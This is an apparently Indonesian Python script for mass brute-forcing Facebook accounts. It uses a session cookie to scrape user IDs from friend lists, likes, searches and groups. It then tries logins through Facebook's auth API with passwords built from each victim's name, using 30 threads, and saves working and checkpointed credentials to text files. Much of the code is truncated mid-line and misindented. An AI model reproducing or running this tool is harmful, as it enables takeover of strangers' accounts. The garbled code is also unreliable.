import os,sys,re,time,json,random,requests
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor
def clear():
    os.system("clear")
    def kata(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./300)
def baner():
time.sleep(0.1)
    kata("""\033[37;1m----------------------------------
   \033[33;1mAUTHOR : Faizul
  \033[33;1mMy Channel : Dbs Channel 
   \033[33;1mFacebook : Faizul
  \033[37;1m- - - - - - - - - - - - - - - - - - - - -""") 
def balik():
    f=input("\033[00m\t[\033[96mEnter To Back\033[00m]")
    if f == "":
       os.system("python mbf.py")
    else:
       sys.exit("\033[1;91mexit\033[00m")
def mbf():
    time.sleep(0.1)
    print("\033[00m[\033[93m1\033[00m] Login")
    print("\033[00m[\033[93m2\033[00m] Update")
    print("\033[00m[\033[93m3\033[00m] Group WA")
    print("\033[00m[\033[93m4\033[00m] Exit")
    time.sleep(0.1)
    f=input("\n\033[90m> \033[1;93m")
    if f == "1":
         print("\033[1;94m=====================================>
         mbasic = 'https://mbasic.facebook.com{}'
         global die,check,result, count
         id = []
         die = 0
         chek = []
         life = []
         count = 0
         check = 0
         result = 0
         def masuk():
             try:
                    cek = open("cookies").read()
             except FileNotFoundError:
                    cek = input("\033[90m> \033[00mCoookies : \>
             cek = {"cookie":cek}
             ismi = ses.get(mbasic.format("/me",verify=False),c>
             if "mbasic_logout_button" in str(ismi):
                     if "Apa yang Anda incar sekarang wkwkw" in st>
                             with open("cookies","w") as f:
                                     f.write(cek["cookie"])
                     else:
                           print("\033[90m> \033[00mChange the >
                           try:
                                  requests.get(mbasic.format(pa>
                           except:
                                  pass                                               try:
                             ikuti = parser(requests.get(mbasic>
                             ses.get(mbasic.format(ikuti),cooki>
                     except :
                             pass
                     return cek["cookie"]
             else:                                                                exit("\033[00m[\033[91m!\033[00m]\033[00mCook>
         def login(username,password,cek=False):
             global die,check,result,count
             b = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a>
             params = {
                     'access_token': b,
                     'format': 'JSON',
                     'sdk_version': '2',
                     'email': username,
                     'locale': 'en_US',
                     'password': password,
                     'sdk': 'ios',
                     'generate_session_cookies': '1',
                     'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
             }
             api = 'https://b-api.facebook.com/method/auth.logi>             response = requests.get(api, params=params)
             if 'EAA' in response.text:
                 print(f"\r\033[00m[\033[1;32m✓\033[00m] \033[1>
                 print()
                 result += 1
                 if cek:
                        life.append(username+"|"+password)
                 else:
                        with open('results-life.txt','a') as f:
                                f.write(username + '|' + passwo>
             elif 'www.facebook.com' in response.json()['error_>
                   print(f"\r\033[00m[\033[1;91mx\033[00m] \033>
                   print()
                   check += 1
                   if cek:
                           chek.append(username+"|"+password)
                   else:
                           with open('results-check.txt','a') a>
                                f.write(username + '|' + passwo>
             else:
                   die += 1
             for i in list('\|/-•'):
                            print(f"\r\033[00m[\033[1;91m{i}\03>
                            time.sleep(0.2)
         def getid(url):
             raw = requests.get(url,cookies=kuki).content
             getuser = re.findall('middle"><a class=".." href=">
             for x in getuser:
                 if 'profile' in x[0]:
                        id.append(x[1] + '|' + re.findall("=(\d>                 elif 'friends' in x:
                        continue
                        else:
                        id.append(x[1] + '|' + x[0].split('/')[>
                 print('\r\033[90m> \033[1;96m' + str(len(id)) >
             if 'Lihat Teman Lain' in str(raw):
                 getid(mbasic.format(parser(raw,'html.parser').>
             return id
         def fromlikes(url):
             try:
                  like = requests.get(url,cookies=kuki).content
                  love = re.findall('href="(/ufi.*?)"',str(like>
                  aws = getlike(mbasic.format(love))
                  return aws
             except:                                                              exit("\033[90m> \033[1;91mcant dump id\033[00>
         def getlike(react):
             like = requests.get(react,cookies=kuki).content
             ids  = re.findall('class="b."><a href="(.*?)">(.*?>
             for user in ids:
                 if 'profile' in user[0]:
                         id.append(user[1] + "|" + re.findall(">
                 else:
                         id.append(user[1] + "|" + user[0].spli>
                 print(f'\r\033[90m \033[1;96m{str(len(id))} \0>
             if 'Lihat Selengkapnya' in str(like):
                 getlike(mbasic.format(parser(like,'html.parser>
             return id
         def bysearch(option):
             search = requests.get(option,cookies=kuki).content
             users = re.findall('class="x ch"><a href="/(.*?)">>
             for user in users:
                  if "profile" in user[0]:
                         id.append(user[1] + "|" + re.findall(">
                  else:
                         id.append(user[1] + "|" + user[0].spli>
                  print(f"\r\033[90m> \033[1;96m{str(len(id))} >
             if "Lihat Hasil Selanjutnya" in str(search):
                  bysearch(parser(search,'html.parser').find("a>
             return id
         def grubid(endpoint):
         grab = requests.get(endpoint,cookies=kuki).content
             users = re.findall('a class=".." href="/(.*?)">(.*>
             for user in users:
                 if "profile" in user[0]:
                         id.append(user[1] + "|" + re.findall('>
                 else:
                         id.append(user[1] + "|" + user[0])
                 print(f"\r\033[90m> \033[1;96m{str(len(id))} \>
             if "Lihat Selengkapnya" in str(grab):
                 grubid(mbasic.format(parser(grab,"html.parser">
             return id
         if __name__ == '__main__':
               try:
                   ses = requests.Session()
                   kukis = masuk()
                   kuki = {'cookie':kukis}
                   clear()
                   baner()
                   kata('\033[1;97m[\033[1;93m1\033[1;97m] \033>
                   kata('\033[1;97m[\033[1;93m2\033[1;97m] \033>
                   kata('\033[1;97m[\033[1;93m3\033[1;97m] \033>
                   kata('\033[1;97m[\033[1;93m4\033[1;97m] \033>                   kata('\033[1;97m[\033[1;93m5\033[1;97m] \033>
                   kata('\033[1;97m[\033[1;93m6\033[1;97m] \033>
                   kata('\033[94m==============================>
                   print()
                   tanya = input('\033[90m> \033[1;93m ')
                   if tanya =="":
                         exit("\033[00m[\033[91m!\033[00m] Dont>
                   elif tanya == '1':
                         url = parser(ses.get(mbasic.format('/m>
                         username = getid(mbasic.format(url["hr>
                   elif tanya == '2':
                         username = input("\033[90m> \033[00mUR>
                         if username == "":
                         exit("\033[00m[\033[91m!\033[0>
                         elif 'www.facebook' in username:
                                 username = username.replace('w>
                         elif 'm.facebook.com' in username:
                                 username = username.replace('m>
                         username = fromlikes(username)
                   elif tanya == '3':
                         knf = input("\033[90m> \033[00mquery :>
                         username = bysearch(mbasic.format('/se>
                         if len(username) == 0:
                                 exit("\033[90m[\033[91m!\033[0>
                   elif tanya == '4':
                         print("\033[90m> \033[00mcan only take>
                         grab = input("\033[90m> \033[00mID gro>
                         username = grubid(mbasic.format("/brow>
                         if len(username) == 0:
                                 exit("\033[00m[\033[91m!\033[0>
                   elif tanya == '5':
                         knf = input("\033[90m> \033[00mUsernam>
                         if knf.isdigit():
                                 user = "/profile.php?id=" + knf
                         else:
                                 user = "/" + knf
                                 try:
                                 user = parser(requests.get(mba>
                                 username = getid(mbasic.format>
                         except TypeError:                                                       exit("\033[00m[\033[91m!\033[0>
                   elif tanya == '6':
                         try:
                                 file1 = open("results-check.tx>
                                 file2 = open("results-life.txt>
                                 a = file1 + file2
                                 final = a.strip().split("\n")
                                 final = set(final)
                                 print(f"\033[00m [\033[1;93m{s>
                                 with ThreadPoolExecutor(max_wo>
                                         for user in final:
                                                 a = user.split>
                                                 ex.submit(logi>
                                 os.remove("results-check.txt")
                                 os.remove("results-life.txt")
                                 for x in life:
                                         with open('results-lif>
                                                 f.write(x+'\n')
                                 for x in chek:
                                         with open('results-che>
                                                 f.write(x+"\n")

                                 print("\n\033[00m[\033[92m✓\03>
                                 print("\033[90m> \033[00msaved>
                         except FileNotFoundError:
                                 exit("\033[00m[\033[91m!\033[0>
                   else:
                         exit("\033[00m[\033[91m!\033[00m] wron>
                   print()
                   expass = input("\033[90m> \033[00mExtra Pass>
                   with ThreadPoolExecutor(max_workers=30) as e>
                          for user in username:
                                  users = user.split('|')
                                  ss = users[0].split(' ')
                                  for x in ss:
                                          listpass = [
                                          str(x) + '123>
                                                  str(x) + '123>
                                                  str(x) + '123>
                                                  str(x) + '12',
                                                  ]
                                          listpass.append(expas>
                                          for passw in set(list>
                                                  ex.submit(log>
                   if check != 0 or result != 0:
                           time.sleep(0.1)
                           print("\033[1;94m===================>
                           print("\n\033[00m[\033[92m✓\033[00m]>
                           print("\033[00m[\033[92m✓\033[00m]li>
                           print("\033[00m[\033[91m!\033[00m]ch>
                           print("\n\n")

                   else:
                           time.sleep(0.1)
                           print("\033[94m=====================>
                           print("\n\033[00m[\033[92m✓\033[00m]>
                           print("\033[00m[\033[91m!\033[00m] n>
               except (KeyboardInterrupt,EOFError):
                       exit()
               except requests.exceptions.ConnectionError:
                       exit("\033[00m[\033[91m!\033[00m] Connec>

    elif f == "2":
         os.system("git pull")
         balik()
         elif f == "3":
         os.system("xdg-open https://chat.whatsapp.com/D4OnRzcS>         balik()

    elif f == "4":
         sys.exit("\033[00m[\033[91m!\033[00m]\033[91mexit\033[>

    else:
         balik()


if __name__=="__main__":
     clear()
     baner()
     mbf()
     balik()
